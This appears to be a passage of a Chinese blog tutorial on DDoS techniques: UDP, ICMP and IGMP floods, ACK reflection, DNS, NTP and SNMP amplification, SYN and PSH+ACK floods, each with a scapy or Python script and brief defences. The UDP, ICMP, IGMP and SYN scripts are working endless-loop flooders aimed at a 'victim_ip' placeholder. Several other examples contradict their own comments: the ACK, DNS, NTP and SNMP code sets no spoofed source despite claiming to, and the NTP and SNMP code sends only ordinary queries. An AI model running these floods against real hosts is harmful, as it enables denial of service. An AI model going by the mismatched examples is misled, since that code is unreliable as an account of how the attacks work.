+<li><strong>攻击方式</strong>：攻击者通常会使用被感染的计算机（例如，僵尸网络中的计算机）来发送大量的 UDP 数据包到目标服务器。由于 UDP 不验证接收端是否准备好接收数据，攻击者只需简单地将目标IP作为目的地址，向目标服务器发送大量的伪造数据包。</li>
+<li><strong>攻击目标</strong>：目标通常是那些需要处理大量网络流量的设备或服务器，如 DNS 服务器、Web 服务器等。UDP 泛洪攻击的目的就是让目标设备因处理过多无效的UDP数据包而无法响应正常用户的请求。</li>
+<li><strong>资源消耗</strong>：当目标服务器接收到大量无效的UDP数据包时，它必须对每个数据包进行处理。即使这些数据包没有实际意义（如伪造的数据包），服务器依然需要分配处理资源。大量的 UDP 数据包会占用服务器的 CPU、内存和网络带宽，最终导致资源耗尽，服务不可用。</li>
+</ul>
+<h6 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用python的 <code>scapy</code> 库模拟</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造目标IP地址</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line">target_port = random.randint(<span class="number">1024</span>, <span class="number">65535</span>)  <span class="comment"># 随机端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># UDP Flood攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">udp_flood</span>():</span><br><span class="line">    ip = IP(dst=target_ip)</span><br><span class="line">    udp = UDP(dport=target_port)</span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span> * <span class="number">1024</span>  <span class="comment"># 1 KB的数据包大小</span></span><br><span class="line">    packet = ip/udp/payload</span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动UDP flood</span></span><br><span class="line">udp_flood()</span><br></pre></td></tr></table></figure>
+
+<h6 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h6><p>攻击分为小包和大包两种方式进行：</p>
+<ul>
+<li>小包指小于64字节的包，相同流量下单包越小，包的数量越多。</li>
+<li>大包指1500字节以上的数据包（超过了MTU）一方面能有效占用传输带宽，另一方面迫使被攻击目标进行分片重组，消耗带宽和性能。</li>
+</ul>
+<h5 id="ICMP-Flood"><a href="#ICMP-Flood" class="headerlink" title="ICMP Flood"></a><strong>ICMP Flood</strong></h5><p>攻击者使用受控主机向被攻击目标发送大量的 ICMP&#x2F;IGMP 报文，进行洪水攻击以消耗目标的带宽资源。</p>
+<h6 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h6><ul>
+<li><strong>请求-响应机制</strong>：在标准的Ping测试中，源主机会发送一个 ICMP Echo Request 消息给目标主机，目标主机在收到请求后会回复一个 ICMP Echo Reply 消息。攻击者通过发送大量请求（Echo Request），目标主机被迫生成大量响应（Echo Reply）。如果目标设备没有做特别的防护，它将需要处理所有这些请求和响应，这就会导致目标服务器过载。</li>
+<li><strong>无连接性</strong>：与 TCP 协议不同，ICMP 协议是无连接的，攻击者可以轻松地伪造源 IP 地址，使得响应消息被发送到伪造的IP地址，从而隐匿攻击者的真实身份。</li>
+<li><strong>带宽和处理能力消耗</strong>：每个 ICMP 数据包虽然并不大，但在大量请求下，目标设备需要为每个请求产生相应的响应。这样在大流量的攻击下，目标的网络带宽和计算能力很容易被耗尽。</li>
+</ul>
+<h6 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 python 的 <code>scapy</code> 库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造目标IP地址</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ICMP Flood攻击</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">icmp_flood</span>():   <span class="comment"># 发送ICMP回显请求（ping请求）</span></span><br><span class="line">    ip = IP(dst=target_ip)</span><br><span class="line">    icmp = ICMP()</span><br><span class="line">    packet = ip/icmp</span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动ICMP洪水攻击</span></span><br><span class="line">icmp_flood()</span><br></pre></td></tr></table></figure>
+
+<h5 id="IGMP-Flood"><a href="#IGMP-Flood" class="headerlink" title="IGMP Flood"></a><strong>IGMP Flood</strong></h5><p>IGMP（Internet Group Management Protocol）是一个协议，用于管理IP网络中的多播组成员。IGMP允许设备在本地网络上加入或退出多播组。多播协议通过允许一台主机向多个目的主机发送数据，从而减少网络带宽的消耗。IGMP是IP协议族的一部分，常用于流媒体视频传输、广播等应用。</p>
+<h6 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h6><ul>
+<li><strong>IGMP 查询与响应</strong>：IGMP 协议中的“查询”和“响应”机制是通过设备（如路由器）向网络中的各个主机发送查询消息，询问哪些主机需要加入多播组。设备收到查询后，会返回响应信息，表明其是否需要接收某个特定的多播数据流。</li>
+<li><strong>攻击方式</strong>：攻击者向目标设备发送大量的 IGMP 加入请求（IGMP Join请求），使得目标设备被迫处理这些请求。这些请求通常是伪造的，因此目标设备会认为这些请求是来自正常用户，从而进行响应，导致目标网络设备的带宽和处理能力消耗殆尽。</li>
+<li><strong>多播资源浪费</strong>：通常，IGMP 多播协议主要用于支持局域网中的多播流量。如果攻击者通过 Flood 的方式发送大量伪造的 IGMP 请求，目标设备的带宽会被占用，并且多播路由信息会被频繁更新，造成性能瓶颈。</li>
+</ul>
+<h6 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a>代码示例</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造目标IP</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建IGMP请求包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">igmp_flood</span>():</span><br><span class="line">    ip = IP(dst=target_ip)</span><br><span class="line">    igmp = IGMP(<span class="built_in">type</span>=<span class="number">0x16</span>)  <span class="comment"># 0x16表示报告类型</span></span><br><span class="line">    packet = ip/igmp</span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动IGMP洪水攻击</span></span><br><span class="line">igmp_flood()</span><br></pre></td></tr></table></figure>
+
+<h6 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h6><ul>
+<li><strong>大规模加入请求</strong>：攻击者向目标网络中的所有设备发送伪造的 IGMP 加入请求。这些请求可能是针对不存在的多播组的虚假请求，导致目标设备无谓地为它们分配多播资源。</li>
+<li><strong>请求泛滥</strong>：攻击者通过不断地向设备发送 “Join” 请求，使得设备的 <strong>IGMP 协议状态表</strong>被迅速填满，导致设备处理和带宽消耗达到上限。</li>
+</ul>
+<h4 id="反射和放大攻击"><a href="#反射和放大攻击" class="headerlink" title="反射和放大攻击"></a>反射和放大攻击</h4><blockquote>
+<p>反射和放大攻击前需要先进行网络扫描，以获得可以反射的服务器。</p>
+</blockquote>
+<p>攻击数据包的目的 IP 地址指向作为反射器的服务器、路由器等设施，源 IP 地址则被伪造成被攻击目标的IP地址。反射器在收到数据包时，会认为该数据包是由被攻击目标所发来的请求，因此会将响应数据发送给被攻击目标。发动反射攻击通常会使用无须认证或握手的协议，绝大多数的反射攻击都是使用基于 UDP 协议的网络服务进行的。</p>
+<p><strong>放大攻击</strong> 是一种反射攻击的一种特殊形式，它利用了服务的放大效应——即利用服务器将小请求放大成更大的响应，使攻击流量在放大过程中显著增大，从而导致更高的带宽消耗。通过这种方式，攻击者可以用非常小的带宽生成大量的攻击流量。</p>
+<h5 id="ACK-反射攻击"><a href="#ACK-反射攻击" class="headerlink" title="ACK 反射攻击"></a><strong>ACK 反射攻击</strong></h5><p>ACK 反射攻击通常利用 TCP 协议中的 ACK 标志位来进行攻击。攻击者伪造源 IP 地址（通常是目标 IP），然后发送带有 ACK 标志的 TCP 包到受害者的网络设备或者其他设备。当网络设备收到这些带有伪造源地址的 TCP 包时，它会尝试响应该包，向伪造的源 IP 发送数据包（也就是目标设备），从而产生不必要的流量。</p>
+<h6 id="前置原理"><a href="#前置原理" class="headerlink" title="前置原理"></a>前置原理</h6><ul>
+<li><strong>TCP 协议简述</strong>：TCP 协议是连接导向的协议，其中包括多个标志位（如 SYN、ACK、FIN 等）。这些标志位用来表示连接的状态，如建立连接、确认数据包等。攻击者伪造一个包含 ACK 标志位的 TCP 包，试图让目标设备认为某个连接已经建立并且需要响应。</li>
+<li><strong>反射特性</strong>：由于 ACK 包在正常情况下是响应某个请求的，因此反射设备会返回 TCP 响应数据包，通常会与源 IP 的请求无关。攻击者的源 IP 被伪造成目标设备的IP，导致目标设备的带宽和计算能力被耗尽。</li>
+</ul>
+<h6 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 Python 的 <code>scapy</code> 库来模拟</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造的目标IP</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line">target_port = <span class="number">80</span>  <span class="comment"># 通常是HTTP端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造源IP，发送ACK包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_ack_attack</span>():</span><br><span class="line">    <span class="comment"># 创建一个TCP SYN包，伪造源IP为目标IP</span></span><br><span class="line">    ip = IP(dst=target_ip)</span><br><span class="line">    tcp = TCP(sport=RandShort(), dport=target_port, flags=<span class="string">&quot;A&quot;</span>)  <span class="comment"># &quot;A&quot; 是ACK标志</span></span><br><span class="line">    pkt = ip/tcp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送ACK包</span></span><br><span class="line">    send(pkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">send_ack_attack()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li><strong>SYN防护</strong>：使用 TCP 协议中的 SYN 防护机制，如 SYN cookies，防止由于 ACK 请求而过度响应。</li>
+<li><strong>源地址验证</strong>：对于反射攻击，防火墙可以通过实施源地址验证来阻止伪造的源 IP 地址流量。</li>
+</ul>
+<h5 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a><strong>DNS放大攻击</strong></h5><blockquote>
+<p>DNS 放大攻击利用了 DNS 的 <strong>递归查询</strong> 机制。</p>
+</blockquote>
+<p>利用 DNS 服务器对小请求返回大响应的特性。在这种攻击中，攻击者伪造源 IP 为目标 IP，然后发送小型 DNS 查询（通常是请求 DNS 记录）到 DNS 服务器。由于 DNS 响应的数据包比请求的数据包要大得多，因此 DNS 服务器会发送大量数据包到目标设备，造成带宽消耗。</p>
+<h6 id="前置原理-1"><a href="#前置原理-1" class="headerlink" title="前置原理"></a>前置原理</h6><p><strong>DNS 协议简介</strong>：DNS 是一种将域名转换为 IP 地址的协议。在正常情况下，DNS 查询返回小的响应（如对应域名的IP地址）。但是，如果攻击者向 DNS 服务器发送伪造的 DNS 查询请求，尤其是请求一些复杂的记录（如包含大量数据的 TXT 记录），则响应的数据包将显著增大。</p>
+<h6 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 Python 的 <code>dnslib</code> 库来模拟 DNS 放大攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> dnslib <span class="keyword">import</span> DNSRecord</span><br><span class="line"><span class="keyword">from</span> dnslib.dns <span class="keyword">import</span> A, PTR, NXDOMAIN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造目标IP地址（目标设备）,攻击流量将会反射到这个 IP</span></span><br><span class="line">target_ip = <span class="string">&#x27;victim_ip&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开放的DNS服务器（可以使用一些公开的DNS服务器）</span></span><br><span class="line">dns_server = <span class="string">&#x27;8.8.8.8&#x27;</span>  <span class="comment"># Google DNS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DNS请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_dns_request</span>():</span><br><span class="line">    qname = <span class="string">&#x27;example.com&#x27;</span>  <span class="comment"># 请求的域名</span></span><br><span class="line">    qtype = <span class="number">255</span>  <span class="comment"># 使用了 ANY 类型查询，这是一个常见的被用来放大流量的查询类型，它会请求更多的信息。</span></span><br><span class="line">    query = DNSRecord.question(qname, qtype)</span><br><span class="line">    <span class="keyword">return</span> query.pack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送DNS请求到目标DNS服务器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_dns_request</span>():</span><br><span class="line">    <span class="comment"># 伪造目标IP</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.sendto(create_dns_request(), (dns_server, <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发反射攻击</span></span><br><span class="line">send_dns_request()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-1"><a href="#防护方式-1" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li><strong>DNS 服务器配置</strong>：防止 DNS 服务器允许源 IP 伪造，限制外部客户端请求大的 DNS 响应（如对 TXT 记录和 MX 记录进行过滤），并确保 DNS 服务器的访问控制清单（ACL）配置严格。</li>
+<li><strong>流量清洗与速率限制</strong>：对 DNS 流量进行清洗和速率限制，防止任何异常的查询流量进入 DNS 服务器。</li>
+<li><strong>禁用递归查询</strong>：限制对外部 DNS 服务器的递归查询请求，仅允许内部网络请求，防止被外部恶意利用。</li>
+</ul>
+<h5 id="NTP放大攻击"><a href="#NTP放大攻击" class="headerlink" title="NTP放大攻击"></a><strong>NTP放大攻击</strong></h5><p>NTP（Network Time Protocol）是用于同步计算机时钟的协议。NTP 服务器通常允许查询并返回当前时间。NTP 放大攻击利用了 NTP 协议的某些特性，尤其是“monlist”命令(在新版中已被禁用）来进行攻击。</p>
+<h6 id="前置原理-2"><a href="#前置原理-2" class="headerlink" title="前置原理"></a>前置原理</h6><ul>
+<li>在 NTP 协议的服务器实现上，通常会实现一系列 Mode 7 的调试接口，而接口中的 monlist 请求能够获取到与目标 NTP 服务器进行同步的最后 600 个客户端的 IP 地址等信息。这意味着，只需要发送一个很小的请求包，就能够触发大量连续的包含 IP 地址信息等数据的 UDP 响应数据包。</li>
+<li>由于 NTP 服务使用的是 UDP 单包通信，因此攻击者可以将伪造源 IP 地址的 UDP 请求包发送给 NTP 放大器，伪造客户端与 NTP 服务器的交互，增加“和 NTP 服务器交互的客户端的数量”，以此来增加 monlist 请求的响应数据量并增大 NTP 放大器的放大倍数。只要向 NTP 放大器发送 600 个不超过 64 字节的请求包(约 40KB 数据)，就能够快速地将 NTP 放大器的放大倍数提高到 700 倍以上，并在该服务器的 NTP 服务关闭或重新启动之前一直保持这么大的放大倍数。</li>
+</ul>
+<h6 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h6><p>使用 <code>ntpdc</code> 或者某些Python脚本来模拟一个NTP放大攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ntplib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造源IP，假设目标IP为 victim_ip</span></span><br><span class="line">victim_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用公开的NTP服务器（例如pool.ntp.org），实际中会使用多个 NTP 服务器</span></span><br><span class="line">ntp_server = <span class="string">&quot;pool.ntp.org&quot;</span></span><br><span class="line"></span><br><span class="line">client = ntplib.NTPClient()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送NTP请求到目标服务器</span></span><br><span class="line">response = client.request(ntp_server, version=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应包的大小（通常在攻击中会观察到响应包的大小大大增加）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NTP Response Size: &quot;</span>, <span class="built_in">len</span>(<span class="built_in">str</span>(response)))</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-2"><a href="#防护方式-2" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li><p>关闭 “monlist” 功能</p>
+<p>：大多数NTP服务器都默认启用 “monlist” 功能，攻击者可以利用这一点进行放大攻击。管理员应禁用这个功能，或将 NTP 服务器配置为不允许外部访问。</p>
+<ul>
+<li>在 NTP 配置文件中禁用 <code>monlist</code>：<code>restrict default noquery</code></li>
+</ul>
+</li>
+<li><p><strong>NTP 服务器配置</strong>：可以配置 NTP 服务器，只允许经过认证的客户端请求，并限制递归请求的访问范围。</p>
+</li>
+</ul>
+<h5 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a><strong>SNMP放大攻击</strong></h5><p>SNMP（Simple Network Management Protocol）是一种用于管理网络设备（如路由器、交换机等）的协议。SNMP 的版本 2 和 3 通常允许网络设备响应查询请求，返回网络设备的统计信息、配置状态等。</p>
+<p>在 <strong>SNMP 放大攻击</strong>中，攻击者利用 SNMP 协议中某些特性来放大攻击流量。SNMP 的响应数据包通常比请求包要大得多，尤其是在目标设备配置了可查询的设备信息时。攻击者可以伪造源 IP 地址，并发送 SNMP 请求到公开的 SNMP 设备，设备会将响应发送到伪造的源 IP（即目标地址）。</p>
+<h6 id="SNMP-放大攻击步骤"><a href="#SNMP-放大攻击步骤" class="headerlink" title="SNMP 放大攻击步骤"></a>SNMP 放大攻击步骤</h6><ol>
+<li>攻击者伪造源IP地址，将目标设备的IP作为源IP。</li>
+<li>攻击者发送一个小的 SNMP 请求，如请求设备的系统信息（例如 <code>GET</code> 请求）。</li>
+<li>设备会返回大量的设备信息作为响应，攻击者将响应流量反射到目标设备。</li>
+<li>攻击者通过利用放大效应，生成大量的流量，从而导致目标带宽和计算资源耗尽。</li>
+</ol>
+<h6 id="代码示例-5"><a href="#代码示例-5" class="headerlink" title="代码示例"></a>代码示例</h6><p>可以使用 Python 的<code>pysnmp</code>库构造一个 SNMP 请求并模拟攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysnmp.hlapi <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&#x27;victim_ip&#x27;</span>  <span class="comment"># 目标设备的IP</span></span><br><span class="line">community = <span class="string">&#x27;public&#x27;</span>     <span class="comment"># 默认公共社区字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个SNMP GET请求</span></span><br><span class="line">iterator = getCmd(SnmpEngine(),</span><br><span class="line">                  CommunityData(community),</span><br><span class="line">                  UdpTransportTarget((target_ip, <span class="number">161</span>)),</span><br><span class="line">                  ContextData(),</span><br><span class="line">                  ObjectType(ObjectIdentity(<span class="string">&#x27;SNMPv2-MIB&#x27;</span>, <span class="string">&#x27;sysDescr&#x27;</span>, <span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求并接收响应</span></span><br><span class="line">errorIndication, errorStatus, errorIndex, varBinds = <span class="built_in">next</span>(iterator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> errorIndication:</span><br><span class="line">    <span class="built_in">print</span>(errorIndication)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> varBind <span class="keyword">in</span> varBinds:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; = &#x27;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> varBind]))</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-3"><a href="#防护方式-3" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li><strong>禁用 SNMP 公共社区字符串</strong>：确保设备的 SNMP 公共社区字符串不公开（如 <code>public</code> 和 <code>private</code>），这些是攻击者常用的默认字符串。</li>
+<li>限制 SNMP 访问：配置设备以只允许特定的源 IP 进行 SNMP 查询，拒绝未授权的访问。</li>
+</ul>
+<h3 id="攻击系统资源"><a href="#攻击系统资源" class="headerlink" title="攻击系统资源"></a>攻击系统资源</h3><h4 id="攻击-TCP-连接"><a href="#攻击-TCP-连接" class="headerlink" title="攻击 TCP 连接"></a>攻击 TCP 连接</h4><blockquote>
+<p>TCP的<strong>创建、数据传送和连接终止</strong>三个阶段都容易受到攻击。</p>
+</blockquote>
+<h5 id="SYN-Flood-连接建立"><a href="#SYN-Flood-连接建立" class="headerlink" title="SYN Flood - 连接建立"></a><strong>SYN Flood - 连接建立</strong></h5><h6 id="协议原理"><a href="#协议原理" class="headerlink" title="协议原理"></a>协议原理</h6><p>TCP 连接的建立采用三次握手过程：</p>
+<ol>
+<li><strong>SYN</strong>：客户端发送一个带有 SYN 标志的数据包，表示请求建立连接。</li>
+<li><strong>SYN-ACK</strong>：服务器响应客户端的 SYN 请求，发送一个带有 SYN 和 ACK 标志的数据包，表示同意建立连接。</li>
+<li><strong>ACK</strong>：客户端再次发送一个带有 ACK 标志的数据包，确认连接建立。</li>
+</ol>
+<h6 id="攻击原理-3"><a href="#攻击原理-3" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>在建立 TCP 连接的过程中，如果在服务器返回 SYN+ACK 报文后，客户端由于某种原因没有对其进行确认，这时服务器端就需要重传 SYN+ACK 报文，并等待客户端的确认报文，直到 TCP 连接超时。这种等待客户端确认的连接状态通常被称为半开连接。在连接超时之前，半开连接会一直保存在服务器的连接表中。</p>
+<p>由于连接表的大小是有限的，如果在短时间内产生大量的半开连接，而这些连接又无法很快地结束，连接表就会迅速被占满，导致新的 TCP 连接无法建立。</p>
+<p>攻击者将 SYN 报文的源 IP 地址随机伪造成其他主机的 IP 地址或不存在的 IP 地址，这样攻击目标会将应答发送给被伪造的 IP 地址，从而占用连接资源并隐藏攻击来源。</p>
+<h6 id="代码示例-6"><a href="#代码示例-6" class="headerlink" title="代码示例"></a>代码示例</h6><p>使用 Python 的 <code>scapy</code> 库实现 SYN Flood 攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 IP 和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;victim_ip&quot;</span></span><br><span class="line">target_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造源 IP</span></span><br><span class="line">source_ip = <span class="string">&quot;attacker_ip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 SYN 包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">syn_flood</span>():</span><br><span class="line">    ip = IP(src=source_ip, dst=target_ip)</span><br><span class="line">    syn = TCP(sport=random.randint(<span class="number">1024</span>, <span class="number">65535</span>), dport=target_port, flags=<span class="string">&quot;S&quot;</span>, seq=random.randint(<span class="number">1</span>, <span class="number">1000</span>))</span><br><span class="line">    packet = ip/syn</span><br><span class="line">    send(packet, loop=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">syn_flood()</span><br></pre></td></tr></table></figure>
+
+<h6 id="防护方式-4"><a href="#防护方式-4" class="headerlink" title="防护方式"></a>防护方式</h6><ul>
+<li>SYN Cookies：在服务器端实现 SYN Cookies 技术，避免为每个半开连接分配资源。</li>
+<li>连接队列限制：限制连接队列的大小，防止过多的半开连接占用资源。</li>
+</ul>
+<h5 id="PSH-ACK-Flood-数据传送"><a href="#PSH-ACK-Flood-数据传送" class="headerlink" title="PSH + ACK Flood - 数据传送"></a><strong>PSH + ACK Flood - 数据传送</strong></h5><h6 id="协议原理-1"><a href="#协议原理-1" class="headerlink" title="协议原理"></a>协议原理</h6><p>在 TCP 协议中，到达目的地的报文将进入 TCP 栈的缓冲区，直到缓冲区满了，报文才被转送给接收系统，此举是为了使系统清空缓冲区的次数达到最小。</p>
+<p>TCP 数据传输过程中，PSH（Push）标志用于指示接收方立即将数据传递给应用层，而 ACK（Acknowledgment）标志用于确认收到的数据。</p>
+<p>在正常的 TCP 传输过程当中，如果待发送的数据将会清空发送缓冲区，那么操作系统的 TCP&#x2F;IP 协议栈就会自动为该 TCP 数据包设置 PSH 标志。同样，当服务端接收到了一个设置了 PSH+ACK 标志的报文时，意味着当前数据传输已经结束，因此需要立即将这些数据递交给服务进程并清空接收缓冲区，而无须等待判断是否还会有额外的数据到达。</p>
+<p>因此当攻击者利用受控主机向攻击目标发送大量的 PSH+ACK 数据包时，被攻击目标就会消耗大量的系统资源不断地进行接收缓冲区的清空处理，导致无法正常处理数据,从而造成拒绝服务。</p>
+<p>单独使用PSH+ACK洪水攻击对服务器产生的影响并不十分明显，更有效的方式是SYN洪水攻击与ACK洪水攻击相结合，这样能够绕过一部分防护设备，增强攻击的效果。</p>
